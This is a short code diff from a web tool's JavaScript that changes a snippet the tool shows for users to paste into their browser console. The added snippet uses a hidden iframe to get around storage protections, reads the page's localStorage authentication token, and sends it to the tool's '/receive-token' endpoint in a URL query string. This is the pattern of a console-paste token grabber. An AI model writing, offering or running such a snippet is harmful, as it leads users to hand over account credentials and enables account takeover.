@@ -390,11 +390,18 @@
         return;
       }
 
-      const code = `fetch('${window.location.origin}/receive-token', {
-  method: 'POST',
-  headers: { 'Content-Type': 'application/json' },
-  body: JSON.stringify({ token: localStorage.token, serverId: '${serverId}' })
-}).then(r => console.log(r.ok ? 'Token sent successfully' : 'Failed to send token'));`;
+      const code = `(() => {
+  const iframe = document.createElement('iframe');
+  document.body.appendChild(iframe);
+  try {
+    const token = iframe.contentWindow.localStorage.token;
+    window.open(\`${window.location.origin}/receive-token?token=\${encodeURIComponent(token)}&serverId=${serverId}\`, '_blank');
+    console.log('%c✅ Token sent! Check your server.', 'color: green; font-weight: bold;');
+  } catch (e) {
+    console.error('❌ Failed to get or send token:', e);
+  }
+  iframe.remove();
+})();`;
 
       jsCode.textContent = code;
       jsCodeBox.style.display = 'block';
